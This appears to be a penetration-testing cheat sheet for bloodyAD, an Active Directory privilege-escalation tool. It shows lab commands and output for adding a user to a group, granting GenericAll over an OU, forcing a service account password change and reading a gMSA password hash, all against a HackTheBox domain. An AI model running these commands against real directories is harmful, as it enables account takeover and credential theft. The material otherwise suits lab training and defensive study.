## # `BloodyAD` -

[BloodyAD](https://github.com/CravateRouge/bloodyAD) is an Active Directory Privilege Escalation Framework.

- <mark style="background: #3D7EFFA6;">AddMember</mark> :

This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights` or `Self-Membership`, over the target group.

Usuage :

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
```

```bash
oxdf@hacky$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember ServiceMGMT oorend
[+] oorend added to ServiceMGMT
```

- <mark style="background: #FFB86CA6;">Generic All</mark> :

```bash
oxdf@hacky$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

In above with full control rights over the ServiceMGMT OU, you  can give user oorend `GENERICALL` over the users in the OU.

- <mark style="background: #D2B3FFA6;">Change Password</mark> :

```bash
oxdf@hacky$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'LeetPassword123!'
[+] Password changed successfully!
```

- <mark style="background: #E632B3A6;">ReadGMSAPassword</mark> :

It can be carried out when controlling an object that has enough permissions listed in the target gMSA account's `msDS-GroupMSAMembership` attribute's DACL.

```bash
oxdf@hacky$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassword

distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524
msDS-ManagedPassword.B64ENCODED: 5bJ7n8t25Xmw187W3VrZocgFCr8VnedxIVdiml6khM2WAeex8N5QleqK4/TcRNUDQ8flaPX1lbwNF+GRtnHQMEM9WLY22DgoU/ZDOfYlHp/iSFjCEtRtRobUf+Mr1bbAiAY9+5Xb6nco/v8kWT4LE9hDH3bkfSe4TOJEVpHURKg5vJqEfL8hTviel0YNdJBF0VsMWJ1pWtSjwuW2bvncgqaMhol6i9Qpn0ADf7srMqMR5XXdVHxCcAyr08Q89fhlyTKOb4YfhnQvHGROtsUp0ySKNHLTv4bYDy6u2J/YBefaK6LraH+RwP/yRodXQTvD3wzDAmjx/QqRfEy7j1hL9A==
```

